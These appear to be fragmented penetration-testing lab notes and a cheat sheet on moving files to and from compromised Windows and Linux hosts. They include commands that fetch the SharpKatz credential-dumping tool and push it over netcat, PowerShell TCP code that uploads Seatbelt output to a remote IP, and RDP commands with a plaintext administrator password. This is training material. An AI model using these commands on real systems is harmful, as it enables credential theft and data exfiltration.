...
```shell-session
0xxNosystemisSafe@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
0xxNosystemisSafe@htb[/htb]$ # Example using Original Netcat
0xxNosystemisSafe@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
0xxNosystemisSafe@htb[/htb]$ # Example using Ncat
0xxNosystemisSafe@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ # Example using Original Netcat
0xxNosystemisSafe@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ # Example using Ncat
0xxNosystemisSafe@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```
...
**here the first path is of remote computer where we want to copy or download from that remotecomputer and then the destination is of local computer**  

## An Alternative to get the file via nc and ncat in powershell raw TCP connection
...
^windows-tcp
```powershell
$client = New-Object System.Net.Sockets.TcpClient('192.168.45.191', 8888); $stream = $client.GetStream(); $buffer = New-Object byte[] 4096; $fs = [System.IO.File]::OpenWrite('Seatbelt.exe'); while(($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -gt 0) { $fs.Write($buffer, 0, $bytesRead) }; $fs.Close(); $stream.Close(); $client.Close()
```

```
ncat -lp port --send-only | --recv-only <> filename  
```
#### Upload

^windows-tcp
```powershell
	$client = New-Object System.Net.Sockets.TcpClient('192.168.45.191', 8888); $stream = $client.GetStream(); $data = [System.IO.File]::ReadAllBytes('Seatbelt-output'); $stream.Write($data, 0, $data.Length); $stream.Close(); $client.Close()
```

```
nc -nvlp port -q 0 <> filename
```
---
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

To access the drive in powershell we have to change to location 
```
cd '\\tsclient\sharename'
```
...
|---|---|
|**Command**|**Description**|
|python -m SimpleHTTPServer [PORT]  <br>python3 -m http.server [PORT]|Python HTTP Server modules|
...
|cpan HTTP::Server::Brick;  <br>perl -MHTTP::Server::Brick -e ‘$s=HTTP::Server::Brick->new(port=>PORT); $s->mount(“/”=>{path=>”.”}); $s->start’|Perl Brick HTTP Server|
...
|powershell -c Invoke-WebRequest -Uri http://ip-addr:port/file -OutFile output_file;  <br>powershell -c (New-Object Net.WebClient).DownloadFile(‘http://ip-addr:port/file’, ‘output_file’)|Powershell Invoke-WebRequest cmdlet or the System.Net.WebClient class|
...
|Wget  <br>wget ftp://user:password@IP_ADDR/path/file -o output_file  <br>FTP  <br>echo open 192.168.1.64 21> ftp.txt  <br>echo anonymous>> ftp.txt  <br>echo ftp@ftp.com>> ftp.txt  <br>echo bin >> ftp.txt  <br>echo get test.txt >> ftp.txt  <br>echo bye >> ftp.txt  <br>ftp -s:ftp.txt|Wget and FTP to download files from an FTP server|
...
|python -c ‘from urllib import urlretrieve; urlretrieve(“http://ip-addr:port/file”, “output_file”)’;  <br>python3 -c ‘from urllib.request import urlretrieve; urlretrieve(“http://ip-addr:port/file”, “output_file”)’|The Python urlretrieve function which is part of the urllib library can be used to download files|
|perl -MLWP::Simple -e ‘getstore(“http://IP_ADDR/file”, “out_file”)’;  <br>perl -e ‘use LWP::Simple; getstore(“http://IP_ADDR/file”, “out_file”)’|Library for WWW in Perl|
...
## [Advance-file-transfer](https://www.verylazytech.com/post-exploitation/file-transfer-cheatsheet-windows-and-linux#id-15.-troubleshooting-file-transfers)
